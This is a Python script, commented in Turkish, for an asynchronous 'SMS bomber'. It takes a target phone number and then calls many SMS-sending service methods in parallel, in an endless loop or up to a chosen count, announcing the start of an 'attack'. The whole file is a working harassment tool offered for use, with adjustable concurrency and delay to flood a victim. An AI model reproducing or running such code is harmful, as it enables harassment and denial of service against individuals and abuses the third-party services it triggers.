import asyncio
import os
import sys
from sms import SendSms
from colorama import Fore, Style, init

# Colorama'yı başlat (Windows'ta renklerin düzgün görünmesi için)
init(autoreset=True)

# SendSms sınıfındaki asenkron servisleri dinamik olarak çek
servisler = [attr for attr in dir(SendSms) 
             if callable(getattr(SendSms, attr)) and not attr.startswith("_")]

def print_banner():
    """Şık bir ASCII banner yazdırır."""
    os.system("cls||clear")
    banner = f"""
{Fore.LIGHTCYAN_EX}      ::::::::  :::::::::: :::::::::         :::    :::::::::: :::::::::: 
{Fore.LIGHTCYAN_EX}     :+:    :+:     :+:     :+:    :+:      :+: :+:  :+:        :+:        
{Fore.LIGHTCYAN_EX}     +:+          +:+      +:+    +:+     +:+   +:+ +:+        +:+         
{Fore.LIGHTGREEN_EX}     +#++:++#++  +#+       +#++:++#:     +#++:++#++ +#++:++#   +#++:++#    
{Fore.LIGHTGREEN_EX}            +#+ +#+        +#+    +#+    +#+     +#+ +#+        +#+        
{Fore.LIGHTCYAN_EX}     #:+    #:+ #+#        #:+    #:+    #:+     #:+ #+#        #:+        
{Fore.LIGHTCYAN_EX}      ::::::::  ########## ###    ###    ###     ### ########## ########## 

{Fore.RED}      ---=============================================================---
{Fore.GREEN}                          [ SZR-KALI ]
{Fore.YELLOW}              Asenkron & Paralel SMS Gönderici v0.1
{Fore.RED}      ---=============================================================---
"""
    print(banner)
    print(f"{Fore.LIGHTMAGENTA_EX}  [!] {Style.RESET_ALL}Mevcut Servis Sayısı: {Fore.LIGHTGREEN_EX}{len(servisler)}{Style.RESET_ALL}\n")

async def task_wrapper(sem, sms_inst, func_name, aralik):
    """Her bir SMS görevini paralel havuzda yönetir."""
    async with sem: # Aynı anda çalışan işlem sayısını kısıtlar
        try:
            method = getattr(sms_inst, func_name)
            await method()
            await asyncio.sleep(aralik)
        except Exception as e:
            # Beklenmedik hataları yakala ama programı durdurma
            print(f"{Fore.RED}[-] {Style.RESET_ALL}Hata ({func_name}): {e}")

async def start_parallel_attack():
    print_banner()
    
    tel = input(f"{Fore.LIGHTYELLOW_EX}  [+] Numara (5xxxxxxxxx): {Fore.LIGHTGREEN_EX}")
    
    # Numara doğrulama (basit)
    if not tel.isdigit() or len(tel) != 10:
        print(f"\n{Fore.RED}[!] Hatalı telefon numarası formatı!")
        return

    mail = input(f"{Fore.LIGHTYELLOW_EX}  [+] Mail (Boşsa rastgele): {Fore.LIGHTGREEN_EX}")
    
    try:
        adet_girdi = input(f"{Fore.LIGHTYELLOW_EX}  [+] Toplam kaç SMS (Sonsuz için Enter): {Fore.LIGHTGREEN_EX}")
        limit = int(adet_girdi) if adet_girdi else None
        
        aralik_girdi = input(f"{Fore.LIGHTYELLOW_EX}  [+] İstekler arası bekleme (sn - Örn: 0.5): {Fore.LIGHTGREEN_EX}")
        aralik = float(aralik_girdi) if aralik_girdi else 0.5
        
        paralel_girdi = input(f"{Fore.LIGHTYELLOW_EX}  [+] Paralellik limiti (Örn: 15): {Fore.LIGHTGREEN_EX}")
        paralel_limit = int(paralel_girdi) if paralel_girdi else 10
        
    except ValueError:
        print(f"\n{Fore.RED}[!] Hatalı giriş yaptınız, sayı girmelisiniz!")
        return

    sms_inst = SendSms(tel, mail)
    sem = asyncio.Semaphore(paralel_limit) 
    
    count = 0
    print(f"\n{Fore.RED}  [!] {Fore.YELLOW}Saldırı başlatıldı... Durdurmak için CTRL+C\n")
    print(f"{Fore.CYAN}  {'-'*60}{Style.RESET_ALL}")

    while limit is None or count < limit:
        current_tasks = []
        for s in servisler:
            if limit and count >= limit:
                break
            # Görevi oluştur ama hemen bekleme (create_task)
            task = asyncio.create_task(task_wrapper(sem, sms_inst, s, aralik))
            current_tasks.append(task)
            count += 1
        
        # Tüm servisleri PARALEL olarak aynı anda başlat
        if current_tasks:
            await asyncio.gather(*current_tasks)
        
        # Sonsuz döngüdeyse ana döngüyü biraz yavaşlat (CPU'yu yormamak için)
        if limit is None:
            await asyncio.sleep(aralik)

    print(f"{Fore.CYAN}  {'-'*60}{Style.RESET_ALL}")
    print(f"\n{Fore.LIGHTGREEN_EX}  [+] {Style.RESET_ALL}İşlem tamamlandı. Toplam istek: {Fore.LIGHTGREEN_EX}{count}")

if __name__ == "__main__":
    try:
        # Windows'ta asenkron döngü politikasını ayarla (gerekirse)
        if sys.platform == 'win32':
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
            
        asyncio.run(start_parallel_attack())
    except KeyboardInterrupt:
        print(f"\n\n{Fore.RED}  [!] İşlem kullanıcı tarafından durduruldu.{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n\n{Fore.RED}  [!] Beklenmedik bir hata oluştu: {e}{Style.RESET_ALL}")
